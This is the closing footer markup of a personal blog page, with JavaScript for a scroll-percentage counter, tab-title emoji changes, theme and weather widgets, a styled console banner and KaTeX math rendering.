    </div>
    <script>
        let back2TopText = document.querySelector('.back-to-top-text')
        window.addEventListener('scroll', function(e) {
            let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
            if (back2TopText) {
                back2TopText.textContent = Math.floor(percent).toString() + '%';
            }
        });
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            document.hidden ? (document.title = "\uD83D\uDE25" + OriginTitile, clearTimeout(titleTime)) : (document.title = "\uD83D\uDE1D" + OriginTitile, titleTime = setTimeout(function() {
                document.title = OriginTitile
            }, 2E3))
        });
        var OriginTitile = document.title;
        
        App.hitokoto();
        
        
        App.weather();
        
        var themeIcon = document.getElementById("themeIcon");
        const currentTheme = window.localStorage.getItem('theme');
        App.clearLog();
        App.outputlog();
        var logo = '%cğŸ³æ¯…ç§å¾ªç¯\'%cBlog';
        console.info(
            logo,
            'color: #ffffff; background: #000000; padding:5px 10px 5px 10px;font-size:40px;border-radius:12px 0 0 12px;', 'color: #000000; background: #FE9A00; padding:5px 10px;font-size:40px;border-radius:0 12px 12px 0;'
        );
        $('img').attr('data-fancybox', 'images');
    </script>
</footer>
    <script>
        renderMathInElement(document.body, {
            delimiters: [{
                left: "$$",
                right: "$$",
                display: true
            }, {
                left: "$",
                right: "$",
                display: false
            }]
        });
    </script>

</html>